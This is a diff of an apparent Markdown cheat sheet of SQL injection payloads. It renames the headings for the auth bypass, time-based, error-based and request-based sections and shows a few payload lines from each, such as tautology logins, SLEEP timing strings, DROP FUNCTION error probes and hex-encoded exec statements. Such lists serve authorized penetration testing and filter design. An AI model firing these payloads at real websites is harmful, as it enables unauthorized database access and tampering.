@@ -7,10 +7,9 @@ Disclaimer: Execution of these commands for attacking websites without the owner
 ## SQL Injection
 
 A SQL Injection attack consists of the insertion or injection of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input to affect the execution of predefined SQL commands.
-##
 
-###  Auth Bypass Payloads
-```mysql
+##  Auth Bypass – Payload
+```sql
 %7C
 %27
 //*
@@ -141,7 +140,7 @@ admin"or 1=1 or ""="
 ' AND (select 1 from users limit 0,1)=1
 ```
 
-### Time Based Payloads
+## Time Based – Payload
 ```mysql
 SLEEP(5)#
 SLEEP(5)--
@@ -244,7 +243,7 @@ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
-### Error Based Payloads
+## Error Based – Payload
 ```mysql
 OR 1=1
 OR 1=0
@@ -293,7 +292,7 @@ IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
 IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
 ```
 
-### Hash, Terminal & URL Payloads
+### Request Based – Payload
 ```mysql
 ' or username like '%
 ' or uname like '%
@@ -539,7 +538,7 @@ declare @q nvarchar (200) 0x730065006c006500630074002000400040007600650072007300
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 ```
 
-### Dangerous Requests
+## Are you in yet?
 ```mysql
 ' OR '' = '
 
